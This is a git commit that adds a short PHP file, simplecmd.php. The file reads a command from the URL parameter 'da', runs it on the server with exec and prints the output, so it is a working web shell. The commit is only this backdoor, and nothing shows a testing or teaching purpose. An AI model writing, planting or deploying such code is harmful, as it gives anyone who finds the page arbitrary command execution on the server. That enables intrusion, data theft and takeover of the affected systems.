2609e19844feacdd13951ceb74ebb9839832f847
DemonArmy <136950303+DemonArmy501@users.noreply.github.com>
2023-11-07 01:30:51 +0700

    simplecmd.php

---
+++ simplecmd.php
@@ -0,0 +1,16 @@
+<?php
+$da = $_GET['da']; 
+
+$cmd = escapeshellcmd($da);
+
+if (!empty($cmd)) {
+    exec($cmd, $output, $return);
+
+    foreach ($output as $line) {
+        echo $line . "<br>";
+    }
+
+    var_dump($cmd, $output, $return);
+} else {
+    echo "";
+}
